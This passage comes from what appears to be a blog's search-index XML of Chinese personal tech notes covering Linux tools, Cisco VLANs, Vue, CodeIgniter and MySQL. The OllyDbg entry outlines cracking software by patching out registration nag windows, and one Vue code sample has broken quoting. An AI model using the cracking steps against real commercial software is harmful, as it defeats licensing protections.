      <url>/TechnicalExperience/Linux/unzip-Garbled.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> arclinux,manjaro解决unzip不能指定编码问题</p></blockquote><span id="more"></span><p>安装<code>kde-servicemenus-unarchiver</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S kde-servicemenus-unarchiver</span><br></pre></td></tr></table></figure><p>使用<code>-e</code>指定编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unar -e GBK test.zip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unzip,unar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vlan相关知识</title>
      <link href="/Internet-equipment/Cisco/about-vlan.html"/>
      <url>/Internet-equipment/Cisco/about-vlan.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 本文收集了学习中的一些疑问而在网络上查询的一些文章</p></blockquote><span id="more"></span><blockquote><p><a href="https://zhuanlan.zhihu.com/p/35616289">为什么需要VLAN</a></p><ul><li>划分广播域</li><li>静态, 动态VLAN</li><li>VLAN的端口类型(Access, trunk)</li><li>VLAN间路由</li></ul><p><a href="https://feichashao.com/broadcast_domain_calculation/">图解：快速计算冲突域和广播域数目</a></p></blockquote><h2 id="本征VLAN"><a href="#本征VLAN" class="headerlink" title="本征VLAN"></a>本征VLAN</h2><p>在trunk接口里, 如果接收到没有Vlan封装的数据包时, 会为其打上native vlan的tag.</p><p>主要作用就是为了兼容不支持vlan的设备</p><h2 id="端口绑定"><a href="#端口绑定" class="headerlink" title="端口绑定"></a>端口绑定</h2><blockquote><p>动态模式下需要ping使用 <code>show mac-address-table</code> 才会显示MAC地址(ARP)</p></blockquote><p>为了VLAN内的安全, 需要将交换机的<strong>端口与主机MAC</strong>或<strong>主机MAC与IP</strong>进行绑定</p><h3 id="绑定MAC"><a href="#绑定MAC" class="headerlink" title="绑定MAC"></a>绑定MAC</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Switch</span>(config)<span class="comment">#interface f0/1</span></span><br><span class="line"><span class="keyword">Switch</span>(config<span class="literal">-if</span>)<span class="comment">#switchport mode access #思科默认端口模式是dynamic(动态),端口绑定不能是动态</span></span><br><span class="line"><span class="keyword">Switch</span>(config<span class="literal">-if</span>)<span class="comment">#switchport port-security #配置端口安全模式</span></span><br><span class="line"><span class="keyword">Switch</span>(config<span class="literal">-if</span>)<span class="comment">#switchport port-security mac-address mac_address #绑定mac</span></span><br></pre></td></tr></table></figure><ul><li>绑定后非该MAC不能使用网络</li></ul><h3 id="绑定MAC与IP"><a href="#绑定MAC与IP" class="headerlink" title="绑定MAC与IP"></a>绑定MAC与IP</h3><ul><li>使用MAC地址ACL表与ip地址ACL表组合</li></ul><blockquote><p>思科2950、3550、4500、6500系列交换机上可以实现，但是需要注意的是2950、3550需要交换机运行增强的软件镜像（Enhanced Image）</p></blockquote><h2 id="cisco三层交换机"><a href="#cisco三层交换机" class="headerlink" title="cisco三层交换机"></a>cisco三层交换机</h2><ul><li><code>no switchport</code>启用路由端口</li><li><code>ip routing</code>启用路由功能</li><li>路由端口不支持子接口</li><li>路由端口不支持二层协议(并不是全部, STP)</li><li>创建SVI要保证VLAN在VLAN数据库内</li></ul><h2 id="Trunk"><a href="#Trunk" class="headerlink" title="Trunk"></a>Trunk</h2><p>配置Trunk需要注意三点：</p><ol><li>两个端口之间本征vlan必须一致</li><li>两端必须都为Trunk</li><li>允许相同vlan通过</li></ol><h3 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h3><ul><li><code>show interfaces [interface_name] trunk</code></li></ul><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><blockquote><p>开启trunk后, 默认会为vlan1转发流量</p></blockquote><p>创建VLAN: <code>vlan vlan_id</code></p><ul><li>创建多个VLAN：<code>vlan 1,3,100-120</code></li><li>vlan_id范围：1-1005</li><li>扩展vlan_id：1006-4096</li></ul><p><strong>显示vlan信息</strong>: <code>show vlan [brief|id vlan_id|name vlan_name|summary]</code></p><ul><li><code>show interfaces [interface_id|vlan vlan_id|switchport]</code></li></ul><p><strong>配置本征VLAN</strong>: <code>switchport trunk native vlan (vlan-id)</code></p><ul><li><strong>不要指定vlan1</strong></li></ul><p><strong>中继链路上允许通过的 VLAN 列表</strong>:<code>switchport trunk allowed vlan vlan-list</code></p><ul><li>list写法: 1,2,3,4….</li><li>默认允许1-1005</li></ul><p><strong>接口switchport信息</strong>: <code>show interfaces (f/g) switchport</code></p><p><strong>更改中继封装协议</strong>: <code>switchport trunk encapsulation (dot1q/isl)</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>winPE结构</title>
      <link href="/Reverse/winPE.html"/>
      <url>/Reverse/winPE.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>PE(ProtbaleExecutable)可执行文件结构是一种规范, 用来指导系统如何执行你设计的程序.</p><p>windows编译器会将代码以PE的形式编译链接成可执行文件.</p><p>PE的优势就是它在硬盘的存储结构和在内存的存储结构是一样的</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">官方解释</a></p></blockquote><span id="more"></span><h2 id="windows-PE结构"><a href="#windows-PE结构" class="headerlink" title="windows PE结构"></a>windows PE结构</h2><ul><li>PE结构整体上可分为<code>头+节区(区块)</code>, 头负责引导win加载器找区块的内容</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>动态调试-OD</title>
      <link href="/Reverse/OD.html"/>
      <url>/Reverse/OD.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>OllyDbg</strong>（以其作者Oleh Yuschuk的名字命名）是一个<a href="https://en.wikipedia.org/wiki/X86">x86</a> <a href="https://en.wikipedia.org/wiki/Debugger">调试器</a>，它着重于二进制代码分析。可以跟踪<a href="https://en.wikipedia.org/wiki/Processor_register">寄存器</a>，识别<a href="https://en.wikipedia.org/wiki/Function_(computer_science)">过程</a>，<a href="https://en.wikipedia.org/wiki/Application_programming_interface">API</a>调用，<a href="https://en.wikipedia.org/wiki/Switch_statement">开关</a>，<a href="https://en.wikipedia.org/wiki/Table_(information)">表</a>，<a href="https://en.wikipedia.org/wiki/Constant_(computer_science)">常量</a>和<a href="https://en.wikipedia.org/wiki/String_(computer_science)">字符串</a></p></blockquote><span id="more"></span><h2 id="界面功能"><a href="#界面功能" class="headerlink" title="界面功能"></a>界面功能</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/od01.png" alt="od1"></p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/od02.png" alt="od02"></p><h2 id="破解方向-无壳"><a href="#破解方向-无壳" class="headerlink" title="破解方向(无壳)"></a>破解方向(无壳)</h2><ul><li>从消息框入手(MessageBox, GetDlgItemTextA…)</li><li>从提示字符串入手<ul><li>比如提示消息窗口时暂停程序然后从调用堆栈里查找关键信息</li><li>直接查找字符串跟随地址分析</li></ul></li></ul><blockquote><p>不建议不断使用断点进行调试, 大概率陷入死循环(windows使用消息队列将各种操作分配给应用程序, 如果没有从窗口执行操作, 那会导致消息队列为空, 导致循环)</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/od03.png" alt=""></p></blockquote><h2 id="去除NAG窗口"><a href="#去除NAG窗口" class="headerlink" title="去除NAG窗口"></a>去除NAG窗口</h2><p>Nag窗口就是软件的提示注册信息</p><p>找到调用窗口函数后可以通过以下方式解决它</p><ul><li>改标志位</li><li>改跳指令(比如je–&gt;jmp)</li><li>使用nop填充(一个nop占一字节)</li><li>使窗口父句柄不存在</li><li>改入口地址(PE头的AddressOfEntryPoint)</li></ul><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><ul><li>call的返回值会赋值给EAX</li><li>找关键语句时需要注意领空, 一般修改的都是程序的领空而不是系统API的领空</li></ul><h2 id="术语参照"><a href="#术语参照" class="headerlink" title="术语参照"></a>术语参照</h2><ul><li><code>领空</code>: 在某时刻CPU执行的代码的所有者, 004013F7一般是执行文件的领空, 7C8114AB一般是DLL的领空</li><li><code>VA(VirtualAdress)</code></li><li><code>RVA(RelativeVirtualAddress)</code></li><li><code>EP(EntryPoint)</code></li><li><code>SEH(Structrued Exception Handling)</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vue学习笔记</title>
      <link href="/Front-end/vue/vue%E6%8C%87%E5%8D%97.html"/>
      <url>/Front-end/vue/vue%E6%8C%87%E5%8D%97.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Custom Elements 标准<br>“自定义元素的名字必须包含一个破折号（-）所以<x-tags>、<my-element>和<my-awesome-app>都是正确的名字，而<tabs>和<foo_bar>是不正确的。这样的限制使得 HTML 解析器可以分辨那些是标准元素，哪些是自定义元素。”<br>Safari 10.1+、Chrome 54+ 和 Firefox 63+ 原生支持 Web Components<br>Vue里面所有东西都是响应式的</p></blockquote><span id="more"></span><h2 id="vue实例"><a href="#vue实例" class="headerlink" title="vue实例"></a>vue实例</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: obj</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>当一个 Vue 实例被创建时，它将 data 对象中的所有的 property 加入到 Vue 的响应式系统中<br>Vue 实例还暴露了一些有用的实例 property 与方法。它们都有前缀 $，以便与用户定义的 property 区分开来<br>详情点击<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE">API 文档</a></p></blockquote><ul><li>使用 Object.freeze(obj)方法，这会阻止修改现有的 property，也意味着响应系统无法再追踪变化</li></ul><h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><blockquote><p>每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，这给了用户在不同阶段添加自己的代码的机会。</p></blockquote><ul><li><a href="https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA">生命周期图示</a><ul><li>created: 在一个实例被创建之后执行代码</li></ul></li></ul><blockquote><p>在定义生命周期函数时千万不要使用箭头函数，会污染外层this</p></blockquote><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><h3 id="文本插值"><a href="#文本插值" class="headerlink" title="文本插值"></a>文本插值</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Message: &#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&#123;&#123;msg&#125;&#125;</code>会被替换成实例里的<code>msg</code>值</p><blockquote><p><code>v-once</code>指令只进行一次性的插值<br><code>&#123;&#123;&#125;&#125;`不会把数据解析成html标签, 对此请使用`v-html`指令, 使用需谨慎### 属性插值在属性里不能使用`&#123;&#123;&#125;&#125;</code></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">&quot;dynamicId&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>vue规定, 对于bool值, 如果非true, 则该属性不会显示出来<br>在<code>&#123;&#123;&#125;&#125;</code>和<code>&quot; &quot;</code>中几乎支持所有js<strong>单个</strong>表达式<br>不应该在表达式里访问用户的全局变量</p></blockquote><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>就是一系列以<code>v-</code>作为前缀的东西, 可以根据其值来影响标签在DOM的表现</p><p>比如<code>v-bind:attr=&#39;var&#39;</code>用于将attr与变量var值绑定</p><p>而<code>v-on:event=&#39;callback&#39;</code>用来监听DOM事件</p><blockquote><p>v-bind可以简写为<code>:</code><br>v-on简写为<code>@</code></p></blockquote><h3 id="动态属性-vue-gt-2-6-0"><a href="#动态属性-vue-gt-2-6-0" class="headerlink" title="动态属性(vue&gt;=2.6.0)"></a>动态属性(vue&gt;=2.6.0)</h3><p><code>v-bind:[attributeName]=&quot;url&quot;</code></p><p>attributeName被作为JS表达式解析, 也会去data里查找该值</p><blockquote><p>注意: 在[]中不能使用空格和引号, 避免大小写, 必须返回字符串, null则代表移除</p></blockquote><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><p>对于任何复杂逻辑，你都应当使用计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#example&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">reversedMessage</span>: &#123;</span><br><span class="line">    <span class="comment">// 计算属性的 getter</span></span><br><span class="line">        <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// `this` 指向 vm 实例</span></span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">this</span>.message.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// set: 可提供setter方法, 提供参数会调用这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Original message: &quot;&#123;&#123; message &#125;&#125;&quot;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Computed reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>虽然方法也能达到相同的效果, 但计算属性多了一个缓存的功能, 原始数据不改变则返回之间的计算结果</p></blockquote><h2 id="侦听器"><a href="#侦听器" class="headerlink" title="侦听器"></a>侦听器</h2><p>设置<code>v-model=&#39;attr&#39;</code>后,attr会与data.attr双向绑定<br>在实例化Vue时如果提供<code>watch.attr()</code>选项, 则数据改变同时会触发该函数</p><blockquote><p>当需要在数据变化时执行异步或开销较大的操作时，这个方式是最有用的。</p></blockquote><p>实例: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;watch-example&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;question&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; answer &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#watch-example&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">question</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">answer</span>: <span class="string">&#x27;I cannot give you an answer until you ask a question!</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  watch: &#123;</span></span><br><span class="line"><span class="string">    // 侦听data的属性</span></span><br><span class="line"><span class="string">    // 如果 `question` 发生改变，这个函数就会运行</span></span><br><span class="line"><span class="string">    question: function (newQuestion, oldQuestion) &#123;</span></span><br><span class="line"><span class="string">      this.answer = &#x27;</span>Waiting <span class="keyword">for</span> you to stop typing...<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure><h2 id="计算属性VS侦听器"><a href="#计算属性VS侦听器" class="headerlink" title="计算属性VS侦听器"></a>计算属性VS侦听器</h2><p>在一般情况下, 选择计算机属性会更好, 需要使用异步或其他开销大的操作时, 才会使用侦听器</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> VUE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux秘钥导入失败解决方法</title>
      <link href="/TechnicalExperience/Linux/Secretkey-failure.html"/>
      <url>/TechnicalExperience/Linux/Secretkey-failure.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 当我使用<code>yay</code>安装软件时, 提示<code>yay gpg: 从公钥服务器接收失败：Server indicated a failure</code>, 记录下我的解决方法</p></blockquote><span id="more"></span><ul><li>将DNS服务器改成8.8.8.8</li></ul>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CI框架</title>
      <link href="/Programming/PHP/CodeIgniter.html"/>
      <url>/Programming/PHP/CodeIgniter.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。</p></blockquote><span id="more"></span><h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><ul><li><p>采用MVC的常见url: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/[controller-class]/[controller-method]/[arguments]</span><br></pre></td></tr></table></figure></li><li><p>控制器将是你 Web 应用程序中处理请求的核心</p></li><li><p>[linux]控制器文件名严格区分大小写</p></li></ul><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><ul><li>遵循MVC, 需要将数据库的操作代码写在模型（Model）文件里面</li></ul><h2 id="踩的坑"><a href="#踩的坑" class="headerlink" title="踩的坑"></a>踩的坑</h2><p>在CodeIgniterI4.11里面, request的getVar等方法需要添加下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Instance of the main Request object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> HTTP\IncomingRequest</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$request</span>;</span><br></pre></td></tr></table></figure><p>写数据库需要allowedFields</p><p>将app/config/filter.php里的toolbar取消</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库笔记</title>
      <link href="/Database/note.html"/>
      <url>/Database/note.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 数据库踩坑记录</p></blockquote><span id="more"></span><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>mysql有全局变量（global），会话变量（local/session）和用户变量</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>使用 <code>show global variables</code> 可以显示全局变量。</p><p><strong>显示mysql安装目录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%basedir%&#x27;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| basedir       | /usr/ |</span><br><span class="line">+---------------+-------+</span><br></pre></td></tr></table></figure><p><strong>显示mysql数据库所在目录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%datadir%&#x27;</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| datadir       | /var/lib/mysql/ |</span><br><span class="line">+---------------+-----------------+</span><br></pre></td></tr></table></figure><p>服务开启时可以动态的使用 <code>set</code> 更改一些可写变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span>&quot;/var/log/mysql/general.log&quot;</span><br></pre></td></tr></table></figure><p>当服务重新启动时，这些变量也会变成默认值</p><p>也可以修改配置文件，当服务启动时会读取里面的变量</p><p>在archlinux系统里mariadb的默认配置文件在/etc/my.cnf和/etc/my.cnf.d/目录，我修改的是/etc/my.cnf.d/server.cnf的mysqld选项</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log_error<span class="operator">=</span><span class="operator">/</span>var<span class="operator">/</span>log<span class="operator">/</span>mysql<span class="operator">/</span>error.log</span><br><span class="line"># general会记录发送给服务器的所有<span class="keyword">SQL</span>记录，默认关闭</span><br><span class="line">general_log<span class="operator">=</span><span class="keyword">ON</span></span><br><span class="line">general_log_file<span class="operator">=</span><span class="string">&#x27;/var/log/mysql/general.log&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>显示全局变量可以用 <code>show global variables like &#39;variable_name&#39;</code>，也可以用 <code>select @@global.variable_name</code></p></blockquote><p>下面一张表记录了我常用的变量</p><table><thead><tr><th>变量</th><th>功能</th></tr></thead><tbody><tr><td>@@version_compile_os</td><td>系统版本</td></tr><tr><td>＠＠hostname</td><td>系统名</td></tr></tbody></table><h2 id="自带的数据库"><a href="#自带的数据库" class="headerlink" title="自带的数据库"></a>自带的数据库</h2><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>这里面保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限，包括变量等都是存在这里。</p><ul><li><code>TABLES</code>：有两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/information-schema-tables.png" alt=""></p><ul><li><code>COLUMNS</code>：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表（desc tablename也一样）。</li><li><code>SCHEMATA</code>：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li><li><code>STATISTICS</code>：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li></ul><h2 id="常用函数和语句"><a href="#常用函数和语句" class="headerlink" title="常用函数和语句"></a>常用函数和语句</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/functions.html">参考MySQL8.0文档</a></p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>version()</td><td>查看当前数据库版本</td></tr><tr><td>database()</td><td>显示当前所处数据库</td></tr><tr><td>user()</td><td>当前用户</td></tr><tr><td><a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_hex"><code>HEX()</code></a></td><td>将输入的数字或字符串输出16进制</td></tr><tr><td><a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file"><code>LOAD_FILE()</code></a></td><td>以字符的形式返回文件的内容</td></tr><tr><td>left(a,b)</td><td>截取字符串a的前b位</td></tr><tr><td>substr(a,b,c)</td><td>截取字符串a从b位截到c位</td></tr><tr><td>if(a,b,c)</td><td>a为true，返回b，否则c</td></tr><tr><td>sleep(sec)</td><td>延迟查询sec秒数</td></tr><tr><td>group_concat()</td><td>将该column的值用<code>,</code>连接起来</td></tr><tr><td>concat()</td><td>将所有的参数连接起来成为字符串</td></tr></tbody></table><table><thead><tr><th>语句</th><th>功能</th></tr></thead><tbody><tr><td>regexp</td><td>后面接正则表达式</td></tr><tr><td>like</td><td>模糊查找，%_</td></tr></tbody></table><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><code>a &lt;&gt; b</code>：如果a!=b则为true</p><p><code>IS NULL</code> or <code>&lt;==&gt;</code>：都可以用来与NULL作比较</p><p><code>＠</code>：用户变量</p><p><code>＠＠</code>：系统变量<br><code>=</code>：在 <code>SET</code> 和 <code>update</code> 语句中是<strong>赋值</strong>的作用，在其他语句是关系运算符<strong>等于</strong></p><p><code>:=</code>：赋值</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p><code>slug</code>列: 对用户和SEO友好</p><ul><li>避免使用中文</li><li>避免使用 <code>for</code> 、<code>and</code>、<code>if</code> 、<code>or</code> 等 停用词（会被搜索引擎过滤）</li><li>保证最终的 <code>url</code> 尽量简短，<code>slug</code> 的长度保持在 3-5 个单词之间</li><li>在 <code>slug</code> 包含内容关键字，并选择正确的关键字</li></ul><p><code>show index from table_name</code>: 显示为该表添加的索引名</p><p><code>KEY</code>与<code>INDEX</code>同义, 都可以建立索引, 建议不要有相同的数据, 方便查询</p><ul><li>KEY | INDEX: MUL</li><li>UNIQUE: UNI</li><li>PRIMARY KEY: PRI</li></ul><p><code>truncate tablename</code>:会清空表的所有记录，并且使自增的id重置。</p><p><code>num = &#39;num+1&#39;</code> 会报错 必须要<code>num=num+1</code>才行, 编程一定要小心</p><p>命令历史记录在用户主目录下.mysql_history里面</p><p><code>into outfile</code>语句可以将选中的数据以 <a href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">特定格式</a> 写入文件，</p><p><code>into dumpfile</code>将数据以单行写入文件，通常用来输出二进制文件</p><p>更新系统权限后使用 <code>flash privilegs</code> 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> sqlilabs.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;sqlilabs&#x27;</span>@<span class="string">&#x27;%&#x27;</span></span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> flush privileges;</span><br></pre></td></tr></table></figure><p>远程访问服务器要绑定0.0.0.0地址</p><ul><li>多表查询的字符集一定要兼容，不然会报错</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 